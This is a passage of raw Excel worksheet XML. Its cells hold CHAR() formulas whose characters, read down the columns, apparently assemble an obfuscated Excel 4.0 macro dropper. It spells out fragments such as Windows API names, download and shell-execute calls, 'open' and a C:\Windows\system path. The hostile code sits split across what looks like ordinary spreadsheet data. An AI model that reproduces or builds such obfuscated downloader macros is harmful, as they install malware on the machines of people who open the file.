      <c r="O42" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="43" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A43" s="1" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="B43" s="1" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="C43" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="D43" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="H43" t="str">
        <f>CHAR(91)</f>
        <v>[</v>
      </c>
      <c r="J43" t="s">
        <v>3</v>
      </c>
      <c r="K43" t="s">
        <v>3</v>
      </c>
      <c r="L43" t="s">
        <v>3</v>
      </c>
      <c r="M43" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="N43" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O43" s="1" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
    </row>
    <row r="44" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A44" s="1" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="B44" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="C44" t="s">
        <v>3</v>
      </c>
      <c r="D44" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="H44" t="str">
        <f>CHAR(45)</f>
        <v>-</v>
      </c>
      <c r="J44" s="1" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="K44" s="1" t="str">
        <f>CHAR(72)</f>
        <v>H</v>
      </c>
      <c r="L44" s="1" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="M44" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="N44" t="s">
        <v>3</v>
      </c>
      <c r="O44" s="1" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
    </row>
    <row r="45" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A45" t="s">
        <v>3</v>
      </c>
      <c r="B45" t="s">
        <v>3</v>
      </c>
      <c r="C45" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="D45" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="H45" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
      <c r="J45" s="1" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="K45" s="1" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="L45" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M45" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="N45" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O45" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
    </row>
    <row r="46" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A46" s="1" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="B46" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="C46" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="D46" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="H46" t="s">
        <v>3</v>
      </c>
      <c r="J46" s="1" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
      <c r="K46" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="L46" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="M46" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="N46" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="O46" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
    </row>
    <row r="47" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A47" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="B47" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="C47" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="D47" t="s">
        <v>3</v>
      </c>
      <c r="H47" t="str">
        <f>CHAR(93)</f>
        <v>]</v>
      </c>
      <c r="J47" t="s">
        <v>3</v>
      </c>
      <c r="K47" s="1" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="L47" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M47" t="s">
        <v>3</v>
      </c>
      <c r="N47" s="1" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="O47" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="48" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A48" s="1" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="C48" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="D48" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="H48" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="J48" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="K48" s="1" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="L48" t="s">
        <v>3</v>
      </c>
      <c r="M48" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="N48" t="s">
        <v>3</v>
      </c>
      <c r="O48" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
    </row>
    <row r="49" spans="1:15" x14ac:dyDescent="0.25">
      <c r="A49" s="1" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="C49" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="D49" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="H49" t="s">
        <v>3</v>
      </c>
      <c r="J49" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="K49" t="s">
        <v>3</v>
      </c>
      <c r="L49" s="1" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="M49" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
      <c r="N49" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O49" s="1" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
    </row>
    <row r="50" spans="1:15" x14ac:dyDescent="0.25">
      <c r="A50" t="s">
        <v>3</v>
      </c>
      <c r="C50" t="s">
        <v>3</v>
      </c>
      <c r="D50" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="H50" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="J50" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="K50" s="1" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="L50" s="1" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="M50" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="N50" s="1" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="O50" s="1" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
    </row>
    <row r="51" spans="1:15" x14ac:dyDescent="0.25">
      <c r="A51" s="1" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="C51" s="1" t="str">
        <f>CHAR(72)</f>
        <v>H</v>
      </c>
      <c r="D51" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="H51" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="J51" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="K51" s="1" t="str">
        <f>CHAR(49)</f>
        <v>1</v>
      </c>
      <c r="L51" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="M51" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="N51" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O51" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="52" spans="1:15" x14ac:dyDescent="0.25">
      <c r="A52" s="1" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="C52" s="1" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="D52" t="s">
        <v>3</v>
      </c>
      <c r="H52" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
      <c r="J52" t="s">
        <v>3</v>
      </c>
      <c r="K52" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="L52" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="M52" t="s">
        <v>3</v>
      </c>
      <c r="N52" s="1" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
      <c r="O52" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="53" spans="1:15" x14ac:dyDescent="0.25">
      <c r="A53" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="C53" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="D53" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="H53" t="str">
        <f>CHAR(53)</f>
        <v>5</v>
      </c>
      <c r="J53" s="1" t="str">
        <f>CHAR(49)</f>
        <v>1</v>
      </c>
      <c r="K53" t="s">
        <v>3</v>
      </c>
      <c r="L53" t="s">
        <v>3</v>
      </c>
      <c r="M53" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="N53" t="s">
        <v>3</v>
      </c>
      <c r="O53" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
    <row r="54" spans="1:15" x14ac:dyDescent="0.25">
      <c r="A54" t="s">
        <v>3</v>
      </c>
      <c r="C54" s="1" t="str">
        <f>CHAR(87)</f>
        <v>W</v>
      </c>
      <c r="D54" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="H54" t="str">
        <f>CHAR(53)</f>
        <v>5</v>
      </c>
      <c r="J54" s="1" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="K54" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="L54" s="1" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="M54" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="N54" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O54" s="1" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
    </row>
    <row r="55" spans="1:15" x14ac:dyDescent="0.25">
      <c r="A55" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="C55" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="D55" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="H55" t="s">
        <v>3</v>
      </c>
      <c r="J55" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="K55" s="1" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="L55" s="1" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="M55" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="N55" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="O55" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
    <row r="56" spans="1:15" x14ac:dyDescent="0.25">
      <c r="A56" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="C56" t="s">
        <v>3</v>
      </c>
      <c r="D56" t="s">
        <v>3</v>
      </c>
      <c r="H56" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="J56" t="s">
        <v>3</v>
      </c>
      <c r="K56" s="1" t="str">
        <f>CHAR(91)</f>
        <v>[</v>
      </c>
      <c r="L56" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M56" t="s">
        <v>3</v>
      </c>
      <c r="N56" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="O56" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="57" spans="1:15" x14ac:dyDescent="0.25">
      <c r="C57" s="1" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="D57" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="J57" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="K57" s="1" t="str">
        <f>CHAR(45)</f>
        <v>-</v>
      </c>
      <c r="L57" t="s">
        <v>3</v>
      </c>
      <c r="M57" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="N57" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O57" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="58" spans="1:15" x14ac:dyDescent="0.25">
      <c r="C58" s="1" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
      <c r="D58" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="J58" s="1" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
      <c r="K58" t="s">
        <v>3</v>
      </c>
      <c r="L58" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="M58" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="N58" t="s">
        <v>3</v>
      </c>
      <c r="O58" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
    </row>
    <row r="59" spans="1:15" x14ac:dyDescent="0.25">
      <c r="C59" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="D59" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="J59" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="K59" s="1" t="str">
        <f>CHAR(51)</f>
        <v>3</v>
      </c>
      <c r="L59" s="1" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="M59" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="N59" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="O59" s="1" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
    </row>
    <row r="60" spans="1:15" x14ac:dyDescent="0.25">
      <c r="C60" t="s">
        <v>3</v>
      </c>
      <c r="D60" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="J60" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="K60" s="1" t="str">
        <f>CHAR(93)</f>
        <v>]</v>
      </c>
      <c r="L60" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="M60" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="N60" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O60" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="61" spans="1:15" x14ac:dyDescent="0.25">
      <c r="C61" s="1" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="D61" t="s">
        <v>3</v>
      </c>
      <c r="K61" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="L61" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M61" t="s">
        <v>3</v>
      </c>
      <c r="N61" s="1" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="O61" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="62" spans="1:15" x14ac:dyDescent="0.25">
      <c r="C62" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="D62" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="K62" t="s">
        <v>3</v>
      </c>
      <c r="L62" t="s">
        <v>3</v>
      </c>
      <c r="M62" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="N62" t="s">
        <v>3</v>
      </c>
      <c r="O62" s="1" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
    </row>
    <row r="63" spans="1:15" x14ac:dyDescent="0.25">
      <c r="C63" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="D63" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="K63" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="L63" s="1" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="M63" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="N63" s="1" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="O63" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="64" spans="1:15" x14ac:dyDescent="0.25">
      <c r="C64" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="D64" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="K64" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="L64" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="M64" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="N64" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="O64" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
    <row r="65" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C65" t="s">
        <v>3</v>
      </c>
      <c r="D65" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="K65" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="L65" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="M65" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="N65" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="O65" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="66" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C66" s="1" t="str">
        <f>CHAR(71)</f>
        <v>G</v>
      </c>
      <c r="D66" t="s">
        <v>3</v>
      </c>
      <c r="K66" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="L66" s="1" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="M66" t="s">
        <v>3</v>
      </c>
      <c r="N66" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O66" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="67" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C67" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="D67" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="K67" t="s">
        <v>3</v>
      </c>
      <c r="L67" t="s">
        <v>3</v>
      </c>
      <c r="M67" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="N67" t="s">
        <v>3</v>
      </c>
      <c r="O67" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
    </row>
    <row r="68" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C68" s="1" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="D68" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
      <c r="K68" s="1" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="L68" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="M68" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="N68" s="1" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
      <c r="O68" s="1" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
    </row>
    <row r="69" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C69" t="s">
        <v>3</v>
      </c>
      <c r="D69" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="K69" s="1" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="L69" s="1" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
      <c r="M69" t="str">
        <f>CHAR(74)</f>
        <v>J</v>
      </c>
      <c r="N69" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O69" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="70" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C70" s="1" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="D70" t="str">
        <f>CHAR(87)</f>
        <v>W</v>
      </c>
      <c r="K70" s="1" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="L70" s="1" t="str">
        <f>CHAR(47)</f>
        <v>/</v>
      </c>
      <c r="M70" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="N70" s="1" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
      <c r="O70" s="1" t="str">
        <f>CHAR(87)</f>
        <v>W</v>
      </c>
    </row>
    <row r="71" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C71" s="1" t="str">
        <f>CHAR(87)</f>
        <v>W</v>
      </c>
      <c r="D71" t="s">
        <v>3</v>
      </c>
      <c r="K71" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="L71" s="1" t="str">
        <f>CHAR(47)</f>
        <v>/</v>
      </c>
      <c r="M71" t="s">
        <v>3</v>
      </c>
      <c r="N71" s="1" t="str">
        <f>CHAR(121)</f>
        <v>y</v>
      </c>
      <c r="O71" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="72" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C72" s="1" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="D72" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="K72" t="s">
        <v>3</v>
      </c>
      <c r="L72" t="s">
        <v>3</v>
      </c>
      <c r="M72" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="N72" t="s">
        <v>3</v>
      </c>
      <c r="O72" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
    </row>
    <row r="73" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C73" s="1" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="D73" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="K73" s="1" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="L73" s="1" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="M73" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="N73" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O73" s="1" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
    </row>
    <row r="74" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C74" t="s">
        <v>3</v>
      </c>
      <c r="D74" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
      <c r="K74" s="1" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="L74" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="M74" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="N74" s="1" t="str">
        <f>CHAR(77)</f>
        <v>M</v>
      </c>
      <c r="O74" s="1" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
    </row>
    <row r="75" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C75" s="1" t="str">
        <f>CHAR(75)</f>
        <v>K</v>
      </c>
      <c r="D75" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="K75" s="1" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="L75" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="M75" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="N75" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="O75" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
    </row>
    <row r="76" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C76" s="1" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="D76" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="K76" t="s">
        <v>3</v>
      </c>
      <c r="L76" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="M76" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="N76" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="O76" s="1" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
    </row>
    <row r="77" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C77" s="1" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
      <c r="D77" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="K77" s="1" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="L77" s="1" t="str">
        <f>CHAR(109)</f>
        <v>m</v>
      </c>
      <c r="M77" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="N77" t="s">
        <v>3</v>
      </c>
      <c r="O77" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="78" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C78" s="1" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="D78" t="s">
        <v>3</v>
      </c>
      <c r="K78" s="1" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="L78" s="1" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
      <c r="M78" t="s">
        <v>3</v>
      </c>
      <c r="N78" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="O78" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="79" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C79" t="s">
        <v>3</v>
      </c>
      <c r="D79" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="K79" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="L79" t="s">
        <v>3</v>
      </c>
      <c r="M79" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="N79" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="O79" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="80" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C80" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="D80" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="K80" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="L80" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="M80" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="N80" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="O80" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="81" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C81" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="D81" t="str">
        <f>CHAR(121)</f>
        <v>y</v>
      </c>
      <c r="K81" t="s">
        <v>3</v>
      </c>
      <c r="L81" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="M81" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="N81" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="O81" s="1" t="str">
        <f>CHAR(121)</f>
        <v>y</v>
      </c>
    </row>
    <row r="82" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C82" s="1" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="D82" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="K82" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="L82" s="1" t="str">
        <f>CHAR(46)&amp;CHAR(115)</f>
